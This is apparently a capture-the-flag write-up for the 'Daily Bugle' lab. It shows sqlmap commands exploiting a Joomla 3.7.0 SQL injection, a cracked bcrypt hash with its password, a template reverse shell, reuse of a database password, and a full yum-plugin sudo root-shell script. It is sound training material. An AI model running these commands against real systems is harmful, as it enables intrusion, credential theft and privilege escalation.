---
description: >-
  Compromise a Joomla CMS account via SQLi, practise cracking hashes and
  escalate your privileges by taking advantage of yum.
---

# Daily Bugle

## Reconnaissance

As always i ran nmap to list open ports.

`sudo nmap -sC -sV -O -oN nmap/scan <IP>`

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oN**: output normal format and store in file nmap/scan

I get back the following result showing that these ports are open:

* **Port 22**: running OpenSSH version 7.4
* **Port 80**: running Apache httpd version 2.4.6
* **Port 3306**: running MariaDB (unauthorized)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration

As shown in the nmap scan there is a robots.txt with following content:

...

/joomla/administrator

/administrator/

...

**The Joomla login panel**

I get to the login panel from joomla over the link .../administrator/ and see the prompt.

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Login with default credentials admin:admin doesen't work. So i have first to get the joomla version to check if there is an exploit for that version.

To get the Joomla version go to [http://10.10.98.243/administrator/manifests/files/joomla.xml](http://10.10.98.243/administrator/manifests/files/joomla.xml).

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Exploitation #1: Joomla

Joomla 3.7.0 is vulnerable to CVE 2017-8917 (SQL injection). Found and described on [https://www.exploit-db.com/exploits/42033](https://www.exploit-db.com/exploits/42033).

The "magic" path is as following:

`/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27`

**Starting SQLmap**

Getting Databases with the parameter `--dbs.`

`sqlmap -u "`[`http://10.10.98.243/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml`](http://10.10.98.243/index.php?option=com\_fields\&view=fields\&layout=modal\&list%5bfullordering%5d=updatexml)`" --dbs -p list[fullordering]`

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Getting Tables from the joomla database. As it is clear that the database is MySQL it can be set as a parameter `--dbms=mysql` so SQLMap doesen't have to check it every time. SQLMap can show tables with the parameters `-D joomla --tables.`

`sqlmap --dbms=mysql -u "`[`http://10.10.98.243/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml`](http://10.10.98.243/index.php?option=com\_fields\&view=fields\&layout=modal\&list%5bfullordering%5d=updatexml)`"  -D joomla --tables -p list[fullordering]`

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Getting Username and Password from `#__users` table with the parmeters and run a shell `-D joomla -T '#__users' --sql_shell`

`sqlmap --dbms=mysql -u "`[`http://10.10.98.243/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml`](http://10.10.98.243/index.php?option=com\_fields\&view=fields\&layout=modal\&list%5bfullordering%5d=updatexml)`" -D joomla -T '#__users' -p list[fullordering] --sql-shell`

`sql-shell > select username, password from #__users;`

<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

**Credentials found**

Following credentials are stored in the file called `hash`.

`jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

**Cracking the hash with john and rockyou.txt**

The format from the hash is bcrypt as shown as `$2y$`. I like to see some progress when i run a task. John shows the progress with the parameter `--progress-every=<seconds>`.

`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash --progress-every=10`

after 5 minutes i have a password for the joomla user jonah:

`jonah:spiderman123`

**Testing ssh connection with the credentials**

Sadly for me and luckily for jonah i can't connect with the same credentials.

**Logging into joomla**

Jonah is a super user. Now i have to look what i can do to get a revshell. I navigate to the templates directory where i can manipulate the `index.php` file.

**Getting the credentials with a python script**

Getting CVE-2017-8917 SQL injection Vulnerability in Joomla! 3.7.0 exploit from [https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py).

<figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Found the credentials just in seconds:

**Getting the weak credentials if the joomla version is not deprecated**

Save from burp request to a file (req)

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Adjusting the password placeholder for ffuf as follows:

<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Calling ffuf with the parameters:

`ffuf -request req -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt:FUZZPASS fs 5139`

I couldn't get it run well. Maybe there is a preventing brute force mechanism in the background.

## Exploitation #2: PHP (Reverse shell)

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

I copied the rev\_shell.php code into the index.php.

I started the netcat listener on port 4444 on the attacker machine and click the \[Template Preview] button.

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

I can see there is a user called jjameson. It's Jonah from before. He is the only user on the system.

**Trying further enumeration with linpeas**

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Trying it with Enum4linux**

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**Being stuck already**

As i don't get any valuable information with linpeas or enum4linux and read the "slogan" of the box again they yell something about "... escalate your privileges by taking advantage of yum".

So i grep yum of the output of the linpeas and get:

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Its time to poke around with yum.

**Yum**

I never heard about yum and have to research for that binary and found [http://yum.baseurl.org](http://yum.baseurl.org).

Its a package manager for RedHat linux (CentOS) written in python.

<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

I was too focused about getting root and forgot that i first have to escalate the privilege to the next user called **jjameson** (jonah) which might have better privileges.

**Search for directories and files from user jjameson**

`find / -user jjameson 2>/dev/null`

<figure><img src="../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

There is no rwx on that file for non jjameson users and the only other finding is the home directory of jjameson that also don't have permissions.

**Back to the roots**

This all needs root privileges and the user apache doesn't have any.

I have to go back to the roots - in this case the joomla directory.

Inspecting the files in the current directory. There is a `configuration.php` file.

**MySQL credentials**

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

**Trying the password for the user jjameson**

`jjameson:nv5uz9r3ZEDzVjNu`

It has worked and i'm now the user jjameson.

**SSH**

I quick made an ssh connection to work with a real shell instead of the pseudo shell.

**sudo**

I tried sudo -l and got the following:

<figure><img src="../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

i have access to manage packages with yum.

## Privilege Escalation

**GTFOBins**

Consulting [https://gtfobins.github.io/gtfobins/yum/#sudo](https://gtfobins.github.io/gtfobins/yum/#sudo) give me the right path.

I took option b) Spawn interactive root shell by loading a custom plugin with following code

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

<figure><img src="../../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

## Discovered vulnerabilities

1. Deprecated joomla version (CVE 2017-8917)
2. CWE-521: Weak Password Requirements
3. CWE-257: Storing Passwords in a Recoverable Format
4. CWE-269: Improper Privilege Management
5. CWE-250: Execution with Unnecessary Privileges

## Lessons learned

1. In most CTF don't go further away to investigate for the next privesc. Firt have a look in your own environment especialy when it's a CMS that was recently exploited.
2. Always keep your software up to date. The deprecated joomla version (3.7.0) had an SQLInjection vulnerability and was the entry point to the server. Thankfully of the SQLi i get some interesting information from the database as credentials of the super user jonah.
3. The credentials from jonah for the joomla login could also get accessed by a brut force attack - with a common password brute force tool - against the login form even if joomla was on the current version.
4. When i see credentials (i.e. in files or notes) just try them against known users and ssh connections.
5. Don't use weak passwords like jonah did (spiderman123)
